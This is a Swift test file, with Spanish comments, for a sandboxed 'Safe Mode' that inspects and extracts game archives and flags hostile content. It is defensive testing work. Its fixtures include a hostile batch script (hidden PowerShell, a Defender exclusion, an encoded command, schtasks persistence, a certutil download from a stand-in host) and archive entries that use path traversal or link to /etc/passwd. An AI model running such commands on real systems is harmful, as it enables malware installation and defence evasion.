import Foundation
import LeverCore

/// Lo de Safe Mode que se puede probar sin lanzar nada: perfiles, listados, reglas y veredictos.
enum SafeModeTests {
    static func run() throws {
        try testPathsAreCanonicalLikeTheKernelSeesThem()
        try testUnsafePathsNeverReachAProfile()
        try testWindowsProfileKeepsHardeningLastAndNetworkOptional()
        try testServerSocketPathMustBeTheOneTheKernelSees()
        try testEscapingLinksAreRemovedButInternalOnesStay()
        try testExtractionProfileConfinesWritesAndLinks()
        try testSevenZipListingRevealsLinksAndPermissions()
        try testLsarListingRevealsLinks()
        try testFormatIsReadFromContentNotExtension()
        try testHostilePathsAreFlagged()
        try testDiskAndEntryLimitsBlockExtraction()
        try testReclaimableSpaceCountsOnlyWhenItIsGoingToBeFreed()
        try testSpacesAreFoundByTheArchiveTheyCameFrom()
        try testDesktopShortcutIsALinkIntoTheSpace()
        try testContentSignalsAndSideLoading()
        try testDeceptiveNames()
        try testVerdictNeverPromisesSafety()
        try testRiskyScriptCommandsAreQuoted()
        try testSignatureScannerOutputIsParsed()
        try testToolIsChosenByContent()
    }

    private static func testPathsAreCanonicalLikeTheKernelSeesThem() throws {
        let tmp = try SandboxPath.canonical(URL(fileURLWithPath: "/tmp"))
        try expect(tmp == "/private/tmp", "/tmp es /private/tmp para Seatbelt")
        let missing = try SandboxPath.canonical(URL(fileURLWithPath: "/tmp/no/existe/aun"))
        try expect(missing == "/private/tmp/no/existe/aun", "una ruta que aún no existe se resuelve por la parte que sí existe")
        let fixture = try TemporaryFixture()
        let real = fixture.directoryURL.appendingPathComponent("real", isDirectory: true)
        try FileManager.default.createDirectory(at: real, withIntermediateDirectories: true)
        let link = fixture.directoryURL.appendingPathComponent("enlace")
        try FileManager.default.createSymbolicLink(at: link, withDestinationURL: real)
        let resolved = try SandboxPath.canonical(link)
        try expect(resolved.hasSuffix("/real") && resolved.hasPrefix("/private/"),
                   "un enlace se resuelve a su destino real, con /private: \(resolved)")
    }

    private static func testUnsafePathsNeverReachAProfile() throws {
        for bad in ["/tmp/a\"b", "/tmp/linea\nnueva", "/tmp/tab\u{1B}esc"] {
            var threw = false
            do { _ = try SandboxPath.canonical(URL(fileURLWithPath: bad)) } catch { threw = true }
            try expect(threw, "una ruta con comillas o control no entra en un perfil: \(bad.debugDescription)")
        }
    }

    private static func windowsSpec(network: Bool) -> WindowsSandboxSpec {
        WindowsSandboxSpec(
            engine: URL(fileURLWithPath: "/tmp/lever-safe/engine"),
            workspaceRoot: URL(fileURLWithPath: "/tmp/lever-safe"),
            writableDirectories: [URL(fileURLWithPath: "/tmp/lever-safe/files")],
            serverDirectory: "/private/tmp/.wine-501/server-1000011-2a",
            serverName: "/tmp/.wine-501/server-1000011-2a",
            userID: 501,
            allowsNetwork: network
        )
    }

    private static func testWindowsProfileKeepsHardeningLastAndNetworkOptional() throws {
        let closed = try SandboxProfile.windowsSession(windowsSpec(network: false)).text
        try expect(closed.hasPrefix("(version 1)\n(deny default)"), "todo parte de denegarlo todo")
        try expect(!closed.contains("(allow network*)"), "sin permiso, no hay regla de red")
        try expect(closed.contains("(global-name \"/tmp/.wine-501/server-1000011-2a\")"),
                   "solo su propio wineserver")
        try expect(!closed.contains("server-*") && !closed.contains("ipc-posix-name-prefix \"/wine-\""),
                   "nada de comodines hacia otros wineserver")
        guard let lastAllow = closed.range(of: "(allow ", options: .backwards),
              let hardening = closed.range(of: "(global-name \"com.apple.runningboard\")") else {
            throw TestFailure(description: "el perfil debe permitir y endurecer")
        }
        try expect(hardening.lowerBound > lastAllow.lowerBound,
                   "el endurecimiento va detrás de todo lo permitido: en SBPL gana la última regla")
        try expect(closed.contains("(deny file-write-xattr (xattr \"com.apple.quarantine\"))"),
                   "no puede quitar la cuarentena")

        let open = try SandboxProfile.windowsSession(windowsSpec(network: true)).text
        try expect(open.contains("(allow network*)") && open.contains("com.apple.dnssd.service"),
                   "con permiso explícito, hay red y DNS")
        try expect(open.contains("(global-name \"com.apple.pasteboard.1\")"),
                   "permitir la red no abre el portapapeles")

        var threw = false
        let bad = WindowsSandboxSpec(engine: URL(fileURLWithPath: "/tmp/e"), workspaceRoot: URL(fileURLWithPath: "/tmp"),
                                     writableDirectories: [], serverDirectory: "/private/tmp",
                                     serverName: "/tmp", userID: 501, allowsNetwork: false)
        do { _ = try SandboxProfile.windowsSession(bad) } catch { threw = true }
        try expect(threw, "un directorio de servidor que no es de Wine no se acepta")
    }

    /// El perfil nombra la carpeta del `wineserver` por su ruta. El kernel compara la resuelta, así
    /// que una ruta que no sea ya la definitiva describiría una carpeta distinta de la que se usa.
    private static func testServerSocketPathMustBeTheOneTheKernelSees() throws {
        let uid = getuid()
        func spec(_ directory: String, _ name: String) -> WindowsSandboxSpec {
            WindowsSandboxSpec(
                engine: URL(fileURLWithPath: "/tmp/lever-safe/engine"),
                workspaceRoot: URL(fileURLWithPath: "/tmp/lever-safe"),
                writableDirectories: [URL(fileURLWithPath: "/tmp/lever-safe/files")],
                serverDirectory: directory, serverName: name, userID: uid, allowsNetwork: false)
        }
        let temporary = try SafeWindowsRunner.wineTemporaryDirectory()
        try expect(temporary == "/private/tmp/.wine-\(uid)", "la carpeta de sockets es la de siempre: \(temporary)")

        var threw = false
        do { _ = try SandboxProfile.windowsSession(spec("\(temporary)/server-a/../server-b",
                                                        "/tmp/.wine-\(uid)/server-b")) } catch { threw = true }
        try expect(threw, "una ruta con .. no llega a un perfil")

        // Y el caso de verdad: alguien deja un enlace donde iría el socket.
        let fixture = try TemporaryFixture()
        let planted = "\(temporary)/server-prueba-enlace"
        unlink(planted)
        try FileManager.default.createSymbolicLink(atPath: planted, withDestinationPath: fixture.directoryURL.path)
        defer { unlink(planted) }
        threw = false
        do { _ = try SandboxProfile.windowsSession(spec(planted, "/tmp/.wine-\(uid)/server-prueba-enlace")) } catch { threw = true }
        try expect(threw, "un enlace en el sitio del socket tampoco")
    }

    /// Crear enlaces dentro del espacio se permite mientras corre Windows —Wine los necesita para
    /// sus unidades—, pero los que salen fuera no se quedan cuando la sesión termina.
    private static func testEscapingLinksAreRemovedButInternalOnesStay() throws {
        let fixture = try TemporaryFixture()
        let fileManager = FileManager.default
        let files = fixture.directoryURL.appendingPathComponent("files/Juego", isDirectory: true)
        try fileManager.createDirectory(at: files, withIntermediateDirectories: true)
        let root = fixture.directoryURL.appendingPathComponent("files", isDirectory: true)
        let secret = try fixture.makeFile(named: "secreto.txt")
        try Data("datos".utf8).write(to: files.appendingPathComponent("partida.sav"))

        try fileManager.createSymbolicLink(atPath: root.appendingPathComponent("fuera").path,
                                           withDestinationPath: secret.path)
        try fileManager.createSymbolicLink(atPath: files.appendingPathComponent("relativo").path,
                                           withDestinationPath: "../../secreto.txt")
        try fileManager.createSymbolicLink(atPath: files.appendingPathComponent("roto").path,
                                           withDestinationPath: "/no/existe/tampoco")
        try fileManager.createSymbolicLink(atPath: root.appendingPathComponent("dentro").path,
                                           withDestinationPath: "Juego/partida.sav")

        let removed = SafeContentScanner.removeEscapingLinks(under: root)
        try expect(removed == 3, "salen tres: el absoluto, el relativo y el roto; quitó \(removed)")
        for gone in ["fuera", "Juego/relativo", "Juego/roto"] {
            try expect((try? fileManager.destinationOfSymbolicLink(atPath: root.appendingPathComponent(gone).path)) == nil,
                       "\(gone) no debe quedarse")
        }
        try expect((try? fileManager.destinationOfSymbolicLink(atPath: root.appendingPathComponent("dentro").path)) != nil,
                   "un enlace que se queda dentro del espacio no molesta a nadie")
        try expect(fileManager.contents(atPath: secret.path) != nil, "y el destino de fuera sigue en su sitio")
    }

    private static func testExtractionProfileConfinesWritesAndLinks() throws {
        let fixture = try TemporaryFixture()
        let archive = try fixture.makeFile(named: "juego.part1.rar")
        let profile = try SandboxProfile.archiveExtraction(
            tool: URL(fileURLWithPath: "/usr/bin/true"),
            archive: archive,
            destination: fixture.directoryURL.appendingPathComponent("destino"),
            temporary: fixture.directoryURL.appendingPathComponent("tmp")
        ).text
        try expect(profile.contains("(deny file-write-create (vnode-type SYMLINK))"), "no se crean enlaces simbólicos")
        try expect(profile.contains("(deny file-link)"), "ni duros")
        try expect(profile.contains("(deny network*)"), "ni red")
        try expect(profile.contains("coreservices.launchservicesd"), "ni LaunchServices")
        try expect(profile.contains(#"juego\.(part[0-9]+\.rar"#), "los demás volúmenes del mismo juego sí se leen")
        let folder = try SandboxPath.canonical(fixture.directoryURL)
        try expect(!profile.contains("(allow file-read* (subpath \"\(folder)\"))"), "pero no la carpeta entera del comprimido")
    }

    private static func testSevenZipListingRevealsLinksAndPermissions() throws {
        let listing = """
        Path = link
        Folder = -
        Size = 12
        Attributes =  lrwxrwxrwx
        Method = Store

        Path = dirlink
        Folder = -
        Size = 0
        Symbolic Link = /Users/alguien/Documents
        Hard Link =

        Path = hl
        Folder = -
        Size = 0
        Symbolic Link =
        Hard Link = /etc/passwd

        Path = tool
        Folder = -
        Size = 18
        Attributes = A_ -rwsr-xr-x
        Encrypted = +

        Path = Carpeta
        Folder = +
        Size = 0
        Attributes = D
        """
        let entries = ArchiveListingParser.parseSevenZip(listing)
        try expect(entries.count == 5, "cinco entradas, obtuvo \(entries.count)")
        try expect(entries[0].isSymbolicLink, "un zip de Unix marca el enlace en los permisos")
        try expect(entries[1].isSymbolicLink && entries[1].linkTarget == "/Users/alguien/Documents", "un tar lo dice aparte")
        try expect(entries[2].isHardLink && !entries[2].isSymbolicLink, "enlace duro")
        try expect(entries[3].hasSetIDBit && entries[3].isEncrypted && entries[3].size == 18, "setuid y cifrado")
        try expect(entries[4].isDirectory, "carpeta")
    }

    private static func testLsarListingRevealsLinks() throws {
        let json = """
        {"lsarContents":[
          {"XADFileName":"dirlink","XADIsLink":true,"XADIsHardLink":0,"XADLinkDestination":"/tmp","XADPosixPermissions":41453},
          {"XADFileName":"hl","XADIsLink":true,"XADIsHardLink":1,"XADLinkDestination":"/etc/passwd"},
          {"XADFileName":"fifo","XADPosixPermissions":4516},
          {"XADFileName":"tool","XADPosixPermissions":2541,"XADFileSize":18,"XADIsEncrypted":1}
        ]}
        """
        guard let entries = ArchiveListingParser.parseLsar(Data(json.utf8)) else {
            throw TestFailure(description: "el JSON de lsar debe leerse")
        }
        try expect(entries[0].isSymbolicLink && !entries[0].isHardLink, "enlace simbólico")
        try expect(entries[1].isHardLink && !entries[1].isSymbolicLink, "lsar marca los duros como enlace y duro")
        try expect(entries[2].isSpecialFile, "una tubería es un archivo especial")
        try expect(entries[3].hasSetIDBit && entries[3].isEncrypted, "setuid (0o4755) y cifrado")
        try expect(ArchiveListingParser.parseLsar(Data("no es json".utf8)) == nil, "basura no es un listado")
    }

    private static func testFormatIsReadFromContentNotExtension() throws {
        let fixture = try TemporaryFixture()
        let disguised = fixture.directoryURL.appendingPathComponent("Juego.rar")
        try SafeModeFixtures.zip([.file("a.txt", "hola")]).write(to: disguised)
        try expect(ArchiveSignature.detect(disguised) == .zip, "un .rar que es un ZIP es un ZIP")
        try expect(ArchiveSignature.expectedFormat(for: disguised) == .rar, "aunque la extensión prometa RAR")

        let tar = fixture.directoryURL.appendingPathComponent("x.bin")
        try SafeModeFixtures.tar([.file("a.txt", "hola")]).write(to: tar)
        try expect(ArchiveSignature.detect(tar) == .tar, "tar por su firma ustar")
        try expect(ArchiveSignature.expectedFormat(for: URL(fileURLWithPath: "/x/juego.7z.001")) == nil,
                   "un volumen .001 no promete formato")

        let assessment = SafeArchiveAnalyzer.assess(archive: disguised, entries: [ArchiveEntry(path: "a.txt", size: 4)],
                                                    format: .zip, archiveBytes: 100, freeBytes: nil)
        try expect(assessment.findings.contains { $0.kind == .extensionMismatch }, "el disfraz se dice")
        try expect(assessment.recommendation.isRecommended, "y basta para recomendar Safe Mode")
    }

    private static func testHostilePathsAreFlagged() throws {
        let entries = [
            ArchiveEntry(path: "../../Library/LaunchAgents/evil.plist", size: 10),
            ArchiveEntry(path: "/etc/periodic/daily/evil", size: 10),
            ArchiveEntry(path: "C:\\Windows\\evil.dll", size: 10),
            ArchiveEntry(path: "link", isSymbolicLink: true, linkTarget: "/Users"),
            ArchiveEntry(path: "hard", isHardLink: true, linkTarget: "/etc/passwd"),
            ArchiveEntry(path: "Readme.txt", size: 1),
            ArchiveEntry(path: "README.TXT", size: 1),
            ArchiveEntry(path: "dev", isSpecialFile: true),
            ArchiveEntry(path: "su", size: 1, hasSetIDBit: true)
        ]
        let assessment = SafeArchiveAnalyzer.assess(archive: URL(fileURLWithPath: "/tmp/x.tar"), entries: entries,
                                                    format: .tar, archiveBytes: 1_000, freeBytes: nil)
        let kinds = Set(assessment.findings.map(\.kind))
        for kind: SafeFindingKind in [.pathTraversal, .absolutePath, .symbolicLink, .hardLink, .caseCollision, .specialFile, .setIDBit] {
            try expect(kinds.contains(kind), "debe señalar \(kind.rawValue)")
        }
        try expect(assessment.findings.filter { $0.kind == .absolutePath }.count == 2,
                   "tanto /ruta como C:\\ruta son absolutas")
        try expect(assessment.blockingProblem == nil, "esto se extrae confinado; no bloquea")
        try expect(assessment.recommendation.isRecommended, "pero se recomienda Safe Mode")
    }

    private static func testDiskAndEntryLimitsBlockExtraction() throws {
        let big = [ArchiveEntry(path: "juego.pak", size: 60_000_000_000, packedSize: 54_000_000_000)]
        let tight = SafeArchiveAnalyzer.assess(archive: URL(fileURLWithPath: "/tmp/juego.zip"), entries: big,
                                               format: .zip, archiveBytes: 54_000_000_000, freeBytes: 61_000_000_000)
        try expect(tight.blockingProblem?.kind == .doesNotFit, "60 GB con 61 libres no caben: se reservan 2 GB")
        try expect(!tight.recommendation.isRecommended, "no caber no es señal de malware")

        let bomb = SafeArchiveAnalyzer.assess(
            archive: URL(fileURLWithPath: "/tmp/b.zip"),
            entries: [ArchiveEntry(path: "zeros.bin", size: 4_000_000_000, packedSize: 3_000_000)],
            format: .zip, archiveBytes: 3_000_000, freeBytes: 100_000_000_000)
        try expect(bomb.findings.contains { $0.kind == .compressionBomb }, "4 GB en 3 MB es una bomba")
        try expect(bomb.declaredBytes == 4_000_000_000 && bomb.largestEntryBytes == 4_000_000_000, "tamaños declarados")

        let many = Array(repeating: ArchiveEntry(path: "a", size: 0), count: SafeArchiveAnalyzer.maximumEntries + 1)
        let flood = SafeArchiveAnalyzer.assess(archive: URL(fileURLWithPath: "/tmp/f.zip"), entries: many,
                                               format: .zip, archiveBytes: 1, freeBytes: nil)
        try expect(flood.blockingProblem?.kind == .tooManyEntries, "demasiadas entradas bloquean")

        let unreadable = SafeArchiveAnalyzer.assess(archive: URL(fileURLWithPath: "/tmp/c.7z"), entries: nil,
                                                    format: .sevenZip, archiveBytes: 1, freeBytes: nil)
        try expect(!unreadable.inspected && unreadable.findings.contains { $0.kind == .unreadableListing },
                   "sin índice no hay inspección")
    }

    /// El hueco que dejarían los espacios anteriores solo cuenta como sitio libre si de verdad se
    /// van a borrar. Esto es lo que hacía que el aviso de «no cabe» llegara tarde: el disco ya
    /// tenía 56 GB de la primera extracción y nadie los contaba ni en un sentido ni en otro.
    private static func testReclaimableSpaceCountsOnlyWhenItIsGoingToBeFreed() throws {
        let archive = URL(fileURLWithPath: "/tmp/juego.rar")
        let entries = [ArchiveEntry(path: "juego.pak", size: 56_000_000_000, packedSize: 54_000_000_000)]
        func assess(reclaimable: Int64) -> ArchiveAssessment {
            SafeArchiveAnalyzer.assess(archive: archive, entries: entries, format: .rar,
                                       archiveBytes: 54_000_000_000, freeBytes: 15_000_000_000,
                                       reclaimableBytes: reclaimable)
        }

        try expect(assess(reclaimable: 0).blockingProblem?.kind == .doesNotFit,
                   "56 GB con 15 libres no caben: un espacio aparte se bloquea antes de empezar")
        try expect(assess(reclaimable: 56_000_000_000).blockingProblem == nil,
                   "pero si se va a borrar la copia anterior, ese hueco es sitio de verdad y sí cabe")
        try expect(assess(reclaimable: 10_000_000_000).blockingProblem?.kind == .doesNotFit,
                   "un hueco que no llega sigue sin caber")
        try expect(SafeArchiveAnalyzer.assess(archive: archive, entries: entries, format: .rar,
                                              archiveBytes: 54_000_000_000, freeBytes: 15_000_000_000)
                        .blockingProblem?.kind == .doesNotFit,
                   "sin decir nada no se descuenta nada: el comportamiento de siempre")
    }

    /// Los espacios se encuentran por el comprimido del que salieron, y solo ésos: ni los de otro
    /// archivo ni los de un programa importado, que sí se reutilizan y no tienen nada que ver.
    private static func testSpacesAreFoundByTheArchiveTheyCameFrom() throws {
        let fixture = try TemporaryFixture()
        let base = fixture.directoryURL.appendingPathComponent("base", isDirectory: true)
        let mine = "/Users/alguien/Escritorio/Bodycam.rar"

        let first = try SafeWorkspace.create(
            origin: SafeWorkspaceOrigin(kind: .archive, path: mine, createdAt: Date(timeIntervalSince1970: 100)), base: base)
        let second = try SafeWorkspace.create(
            origin: SafeWorkspaceOrigin(kind: .archive, path: mine, createdAt: Date(timeIntervalSince1970: 200)), base: base)
        _ = try SafeWorkspace.create(origin: SafeWorkspaceOrigin(kind: .archive, path: "/otro.rar"), base: base)
        _ = try SafeWorkspace.create(origin: SafeWorkspaceOrigin(kind: .program, path: mine), base: base)

        let found = SafeWorkspace.all(forArchiveAt: mine, base: base)
        try expect(found.count == 2, "salen los dos del mismo comprimido y nada más: \(found.count)")
        try expect(found.map(\.id) == [second.id, first.id], "del más reciente al más antiguo")
        try expect(SafeWorkspace.all(forArchiveAt: "/no/extraido.rar", base: base).isEmpty,
                   "un comprimido que nunca se extrajo no tiene espacios")
        // El camino de los programas no se toca: ése sí reutiliza, para no perder las partidas.
        try expect(SafeWorkspace.existing(forProgramAt: mine, base: base) != nil,
                   "y el de un programa se sigue encontrando por su lado")
    }

    /// El acceso del Escritorio es un **enlace**, y eso no es comodidad: `containing(_:)` es lo que
    /// hace que un `.exe` de aquí se abra en Safe Mode, y busca la ruta dentro de la base. Por el
    /// enlace se sigue llegando a la misma carpeta, así que lo sigue reconociendo; una copia en el
    /// Escritorio no, y ese programa pasaría a abrirse sin aislar.
    private static func testDesktopShortcutIsALinkIntoTheSpace() throws {
        let fixture = try TemporaryFixture()
        let fileManager = FileManager.default
        let base = fixture.directoryURL.appendingPathComponent("base", isDirectory: true)
        let desktop = fixture.directoryURL.appendingPathComponent("Escritorio", isDirectory: true)
        let workspace = try SafeWorkspace.create(origin: SafeWorkspaceOrigin(kind: .archive, path: "/x.rar"), base: base)
        try Data("juego".utf8).write(to: workspace.files.appendingPathComponent("juego.exe"))

        let link = try workspace.createDesktopShortcut(named: "Bodycam (Safe Mode)", desktop: desktop)
        var info = stat()
        try expect(lstat(link.path, &info) == 0 && (info.st_mode & S_IFMT) == S_IFLNK, "es un enlace, no una copia")
        try expect((try? fileManager.destinationOfSymbolicLink(atPath: link.path)) == (try? SandboxPath.canonical(workspace.files)),
                   "y apunta a lo extraído")
        let through = link.appendingPathComponent("juego.exe")
        try expect(SafeWorkspace.containing(through, base: base)?.id == workspace.id,
                   "un programa abierto por el enlace se sigue reconociendo como de dentro del espacio")

        // Pedirlo dos veces no llena el Escritorio de accesos repetidos.
        let again = try workspace.createDesktopShortcut(named: "Bodycam (Safe Mode)", desktop: desktop)
        try expect(again.path == link.path, "el segundo intento reutiliza el enlace que ya estaba")

        let real = desktop.appendingPathComponent("mis cosas.txt")
        try Data("no tocar".utf8).write(to: real)
        SafeWorkspace.removeDesktopShortcuts(into: workspace, desktop: desktop)
        try expect(lstat(link.path, &info) != 0, "al borrar el espacio, su acceso no se queda apuntando a la nada")
        try expect(fileManager.fileExists(atPath: real.path), "y un archivo de verdad del Escritorio no se toca")
    }

    private static func testContentSignalsAndSideLoading() throws {
        let entries = [
            ArchiveEntry(path: "Juego/Binaries/Win64/Juego-Win64-Shipping.exe", size: 100),
            ArchiveEntry(path: "Juego/Binaries/Win64/winmm.dll", size: 10),
            ArchiveEntry(path: "Juego/Binaries/Win64/OnlineFix64.dll", size: 10),
            ArchiveEntry(path: "Juego/Engine/ThirdParty/DbgHelp/dbghelp.dll", size: 10),
            ArchiveEntry(path: "Juego/_CommonRedist/vcredist/VC_redist.x64.exe", size: 10),
            ArchiveEntry(path: "Run Me!.bat", size: 10),
            ArchiveEntry(path: "Web.url", size: 10),
            ArchiveEntry(path: "Otra.app/Contents/MacOS/Otra", size: 10),
            ArchiveEntry(path: "Otra.app/Contents/Info.plist", size: 10),
            ArchiveEntry(path: "dentro.zip", size: 10)
        ]
        let assessment = SafeArchiveAnalyzer.assess(archive: URL(fileURLWithPath: "/tmp/j.zip"), entries: entries,
                                                    format: .zip, archiveBytes: 1_000, freeBytes: nil)
        let sideLoading = assessment.findings.filter { $0.kind == .dllSideLoading }
        try expect(sideLoading.map(\.subject) == ["Juego/Binaries/Win64/winmm.dll"],
                   "winmm.dll junto al ejecutable es carga por suplantación; dbghelp.dll sin ejecutable al lado, no: \(sideLoading)")
        try expect(assessment.findings.contains { $0.kind == .windowsInstaller && $0.subject.hasSuffix("VC_redist.x64.exe") },
                   "un redistribuible es un instalador")
        try expect(assessment.findings.contains { $0.kind == .script && $0.subject == "Run Me!.bat" }, "un .bat es un script")
        try expect(assessment.findings.filter { $0.kind == .macProgram }.count == 1, "una .app se cuenta una vez")
        try expect(assessment.findings.contains { $0.kind == .nestedArchive }, "comprimido dentro")
        try expect(assessment.findings.contains { $0.kind == .webShortcut }, "acceso a web")
    }

    private static func testDeceptiveNames() throws {
        try expect(SafeContentRules.isDeceptiveName("factura.pdf.exe"), "doble extensión")
        try expect(SafeContentRules.isDeceptiveName("foto\u{202E}gpj.exe"), "carácter que invierte el texto")
        try expect(SafeContentRules.isDeceptiveName("documento.pdf            .scr"), "espacios que esconden la extensión")
        try expect(!SafeContentRules.isDeceptiveName("Bodycam-Win64-Shipping.exe"), "un ejecutable normal no engaña")
        try expect(!SafeContentRules.isDeceptiveName("notas.pdf"), "un documento no es un ejecutable")
    }

    private static func testVerdictNeverPromisesSafety() throws {
        var report = SafeReport(findings: [SafeFinding(.windowsProgram, subject: "x", detail: "1")])
        try expect(report.verdict == .nothingSuspicious, "sin escáner: «nada sospechoso», no «seguro»")
        report.signatureScan = .clean(engine: "ClamAV 1.5.4")
        try expect(report.verdict == .noKnownThreats, "con escáner limpio: «sin amenazas conocidas»")
        report.findings.append(SafeFinding(.dllSideLoading, subject: "winmm.dll"))
        try expect(report.verdict == .suspicious(1), "un hallazgo de aviso cuenta como sospechoso")
        report.signatureScan = .detected(engine: "ClamAV", count: 2)
        try expect(report.verdict == .knownThreats(2), "una amenaza conocida manda sobre todo")
        let encrypted = SafeReport(findings: [SafeFinding(.encryptedContent, subject: "x")])
        try expect(encrypted.verdict == .unverified, "cifrado: no verificado")
        try expect(SafeReport(inspected: false).verdict == .unverified, "sin inspección: no verificado")
    }

    private static func testRiskyScriptCommandsAreQuoted() throws {
        let fixture = try TemporaryFixture()
        let benign = fixture.directoryURL.appendingPathComponent("Run Me!.bat")
        try Data("""
        @echo off
        set "GAME_EXE=%GAME_DIR%\\Bodycam.exe"
        pushd "%GAME_DIR%"
        start "" "%GAME_EXE%"
        """.utf8).write(to: benign)
        try expect(SafeContentScanner.riskyCommands(in: benign) == nil, "un lanzador normal no tiene órdenes de riesgo")

        let hostile = fixture.directoryURL.appendingPathComponent("setup.bat")
        try Data("""
        powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath C:\\"
        powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA
        schtasks /create /tn upd /tr evil.exe
        certutil -urlcache -f http://example.invalid/x.exe x.exe
        """.utf8).write(to: hostile)
        let matches = SafeContentScanner.riskyCommands(in: hostile) ?? ""
        for expected in ["-WindowStyle Hidden", "Add-MpPreference", "schtasks /create", "certutil -urlcache"] {
            try expect(matches.localizedCaseInsensitiveContains(expected), "debe citar «\(expected)»: \(matches)")
        }
    }

    private static func testSignatureScannerOutputIsParsed() throws {
        let root = URL(fileURLWithPath: "/tmp/espacio/files")
        let output = """
        /tmp/espacio/files/Juego/crack.dll: Win.Trojan.Agent-123 FOUND
        /tmp/espacio/files/eicar.com: Eicar-Test-Signature FOUND
        """
        let findings = SignatureScanner.detections(in: output, relativeTo: root)
        try expect(findings.count == 2 && findings[0].subject == "Juego/crack.dll" && findings[0].detail == "Win.Trojan.Agent-123",
                   "ruta relativa y nombre de la firma: \(findings)")
        try expect(SignatureScanner.engineDescription("ClamAV 1.5.4/28122/Sun Sep 13 02:26:25 2026") == "ClamAV 1.5.4 · 13 Sep 2026",
                   "versión y fecha de las firmas")
    }

    private static func testToolIsChosenByContent() throws {
        let seven = ArchiveTool.sevenZip(URL(fileURLWithPath: "/x/7zz"))
        let unar = ArchiveTool.unar(URL(fileURLWithPath: "/x/unar"))
        try expect(SafeExtractor.toolOrder(for: .rar, available: [seven, unar]) == [unar, seven], "RAR: unar primero")
        try expect(SafeExtractor.toolOrder(for: .zip, available: [seven, unar]) == [seven, unar],
                   "ZIP (aunque se llame .rar): 7zz primero, que es el que sabe de Zstd")
    }
}
